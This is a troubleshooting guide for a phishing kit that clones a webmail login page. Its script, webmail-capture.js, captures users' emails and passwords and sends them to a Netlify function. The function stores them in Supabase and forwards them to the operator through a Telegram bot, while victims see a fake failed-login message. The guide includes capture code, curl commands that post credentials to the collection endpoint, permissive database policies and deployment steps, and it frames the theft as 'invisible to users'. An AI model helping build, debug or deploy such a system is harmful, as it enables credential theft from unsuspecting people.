# Troubleshooting Guide - Login Capture System

## 🧪 Testing the System

### Quick Test
Visit: `https://your-domain.com/test`

This test page will:
- Show debug output in real-time
- Test the capture function
- Display success/error messages
- Show if Telegram notification was sent

### Test Checklist
1. ✅ Form appears correctly
2. ✅ Submit button works
3. ✅ No JavaScript errors in console
4. ✅ Backend function responds (200 status)
5. ✅ Data appears in database
6. ✅ Telegram notification received
7. ✅ Data visible in /verify dashboard

---

## 🔍 Common Issues & Solutions

### Issue 1: "Not Working" - Nothing Happens

**Symptoms:**
- Form submits normally
- No data captured
- No errors shown

**Solutions:**

1. **Check if JavaScript is loaded:**
```javascript
// Open browser console (F12) and type:
console.log('webmail-capture.js loaded?');
// Should see the script
```

2. **Verify form ID:**
```bash
# The form MUST have id="ecWebmailSession"
# Check index.html line 8231
```

3. **Check browser console for errors:**
- Press F12
- Go to Console tab
- Look for red error messages

4. **Verify script is included:**
```html
<!-- Should be at end of index.html -->
<script src="js/webmail-capture.js"></script>
```

---

### Issue 2: Database Errors

**Symptoms:**
- "Failed to store login attempt"
- 500 error from backend

**Solutions:**

1. **Check if table exists:**
```sql
SELECT * FROM login_attempts LIMIT 1;
```

2. **Verify RLS policy:**
```sql
SELECT * FROM pg_policies WHERE tablename = 'login_attempts';
```

3. **Check Supabase URL:**
```bash
# In .env file, should be:
VITE_SUPABASE_URL=https://qielniwrgjgkfzmyhveg.supabase.co
VITE_SUPABASE_ANON_KEY=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

4. **Service Role Key (if using):**
```bash
# Optional for bypassing RLS
VITE_SUPABASE_SERVICE_ROLE_KEY=your_service_role_key
```

---

### Issue 3: No Telegram Notifications

**Symptoms:**
- Data captured in database
- No Telegram message received

**Solutions:**

1. **Check environment variables:**
```bash
# Must be set in Netlify:
BOT_TOKEN=123456789:ABCdefGHIjklMNOpqrsTUVwxyz
CHAT_ID=987654321
```

2. **Test Telegram bot:**
```bash
# Visit this URL (replace with your token):
https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getMe

# Should return bot info
```

3. **Send test message:**
```bash
# Replace BOT_TOKEN and CHAT_ID:
curl -X POST "https://api.telegram.org/bot<BOT_TOKEN>/sendMessage" \
  -d "chat_id=<CHAT_ID>" \
  -d "text=Test message"
```

4. **Check bot hasn't blocked you:**
- Make sure you've sent `/start` to your bot
- Check bot privacy settings

---

### Issue 4: 404 Not Found - Netlify Function

**Symptoms:**
- `/.netlify/functions/capture-login` returns 404

**Solutions:**

1. **Check function file exists:**
```bash
ls -la functions/capture-login.js
```

2. **Verify netlify.toml:**
```toml
[build]
  functions = "functions"
```

3. **Check Netlify deployment logs:**
- Netlify Dashboard > Deploys > Latest deploy
- Look for function deployment messages

4. **Redeploy:**
```bash
git add .
git commit -m "Fix functions"
git push
```

---

### Issue 5: Verify Dashboard Shows No Data

**Symptoms:**
- `/verify` page loads
- "No login attempts found"
- But data is in database

**Solutions:**

1. **Check Supabase credentials in verify.html:**
```javascript
// Should match your actual Supabase project
const SUPABASE_URL = 'https://qielniwrgjgkfzmyhveg.supabase.co';
const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...';
```

2. **Check browser console:**
- F12 > Console
- Look for CORS or API errors

3. **Test Supabase connection:**
```javascript
// Open console on /verify page:
supabase.from('login_attempts').select('*').limit(1)
  .then(r => console.log('Data:', r))
```

4. **Check RLS policies allow SELECT:**
```sql
-- Should allow public to read
CREATE POLICY "Service role can do everything"
  ON login_attempts FOR ALL
  USING (true);
```

---

### Issue 6: Form Shows Error but Nothing Captured

**Symptoms:**
- Form shows "Invalid username or password"
- Nothing in database
- No Telegram notification

**Solutions:**

1. **This is NORMAL behavior if capture fails**
   - Error message always shows (by design)
   - Looks like failed login to user

2. **Check backend function logs:**
   - Netlify Dashboard > Functions > capture-login
   - View recent invocations
   - Check for errors

3. **Test with /test page:**
   - Go to `/test`
   - See detailed debug output
   - Identifies exact failure point

---

### Issue 7: CORS Errors

**Symptoms:**
- "CORS policy blocked"
- Network errors in console

**Solutions:**

1. **Check function headers:**
```javascript
// In capture-login.js:
const headers = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'Content-Type',
  'Access-Control-Allow-Methods': 'POST, OPTIONS'
};
```

2. **OPTIONS request handling:**
```javascript
if (event.httpMethod === 'OPTIONS') {
  return { statusCode: 200, headers, body: '' };
}
```

---

### Issue 8: Empty Password Field

**Symptoms:**
- Email captured correctly
- Password is empty or "(empty)"

**Solutions:**

1. **Check field name:**
```html
<!-- MUST be exactly: -->
<input name="PASSWORD" type="password">
```

2. **Check JavaScript selector:**
```javascript
// In webmail-capture.js:
const passwordField = form.querySelector('input[name="PASSWORD"]');
```

3. **Browser autofill issues:**
```javascript
// Add delay to let autofill complete
setTimeout(() => {
  const password = passwordField.value;
}, 100);
```

---

## 🛠️ Debug Steps

### Step 1: Test with Debug Page
```bash
# Visit:
https://your-domain.com/test

# Enter test credentials
# Watch debug output
```

### Step 2: Check Browser Console
```
F12 > Console Tab
Look for:
- JavaScript errors (red)
- Network requests
- Function responses
```

### Step 3: Check Network Tab
```
F12 > Network Tab
Filter: Fetch/XHR
Look for:
- /.netlify/functions/capture-login
- Status code (should be 200)
- Response body
```

### Step 4: Check Netlify Logs
```
Netlify Dashboard
> Functions
> capture-login
> Recent invocations
```

### Step 5: Check Supabase
```
Supabase Dashboard
> Table Editor
> login_attempts
> Check for new rows
```

### Step 6: Check Telegram
```
Open Telegram
Check bot messages
Should see notification
```

---

## 📋 Verification Checklist

### Backend (Netlify Functions)
- [ ] `functions/capture-login.js` exists
- [ ] Function deployed successfully
- [ ] Environment variables set
- [ ] Function returns 200 on test
- [ ] Supabase credentials correct

### Database (Supabase)
- [ ] `login_attempts` table exists
- [ ] RLS policies configured
- [ ] Can insert test record
- [ ] Can select records
- [ ] URLs match in code

### Frontend (JavaScript)
- [ ] `js/webmail-capture.js` exists
- [ ] Script included in index.html
- [ ] Form ID is correct (ecWebmailSession)
- [ ] Field names correct (USERNAME, PASSWORD)
- [ ] No JavaScript errors

### Telegram (Optional)
- [ ] Bot created with @BotFather
- [ ] BOT_TOKEN set
- [ ] CHAT_ID set
- [ ] Bot not blocked
- [ ] Test message works

### Dashboard
- [ ] `/verify` page loads
- [ ] Supabase credentials correct
- [ ] Can see test data
- [ ] Actions work (verify, delete, notes)

---

## 🔧 Manual Testing

### Test Database Directly
```javascript
// In browser console on /verify page:
const { data, error } = await supabase
  .from('login_attempts')
  .insert([{
    email: 'test@test.com',
    password: 'testpass',
    ip_address: '1.2.3.4',
    user_agent: 'Test',
    source_url: 'test',
    screen_info: '{}',
    telegram_sent: false
  }]);

console.log('Insert result:', { data, error });
```

### Test Telegram Directly
```bash
curl -X POST \
  "https://api.telegram.org/bot<YOUR_BOT_TOKEN>/sendMessage" \
  -d "chat_id=<YOUR_CHAT_ID>" \
  -d "text=Test from curl"
```

### Test Netlify Function
```bash
curl -X POST \
  "https://your-domain.com/.netlify/functions/capture-login" \
  -H "Content-Type: application/json" \
  -d '{
    "email": "test@example.com",
    "password": "testpass123",
    "ip": "1.2.3.4",
    "userAgent": "Test",
    "sourceUrl": "test",
    "screenInfo": "{}",
    "timestamp": "2025-01-01T00:00:00Z",
    "telegramMessage": "Test message"
  }'
```

---

## 📞 Still Not Working?

### Collect This Information:

1. **Error Messages:**
   - Browser console errors
   - Netlify function logs
   - Network tab responses

2. **Configuration:**
   - Supabase URL
   - Function deployment status
   - Environment variables (don't share actual tokens!)

3. **Test Results:**
   - `/test` page output
   - Database query results
   - Telegram test results

4. **Environment:**
   - Browser name/version
   - Device type
   - Deployment platform

### Quick Fixes:

1. **Clear everything and redeploy:**
```bash
git add .
git commit -m "Redeploy all"
git push
```

2. **Check all URLs match:**
```bash
# All these should use same Supabase URL:
grep -r "supabase.co" . --include="*.js" --include="*.html"
```

3. **Verify environment variables:**
```bash
# In Netlify Dashboard:
Site Settings > Environment Variables
# Should have all required variables
```

---

## ✅ Success Indicators

When everything is working correctly:

1. ✅ Test page shows "Capture successful"
2. ✅ Telegram notification received instantly
3. ✅ Data appears in `/verify` dashboard
4. ✅ Email and password visible clearly
5. ✅ No errors in browser console
6. ✅ No errors in Netlify function logs
7. ✅ User sees error message (as designed)

---

## 🎯 Next Steps After Success

1. Test with real webmail form
2. Remove test page (optional)
3. Monitor `/verify` dashboard
4. Set up regular backups
5. Document your specific setup

---

**Remember:** The system is designed to be invisible to users. They should only see a normal failed login message, while you receive the credentials via Telegram and database.
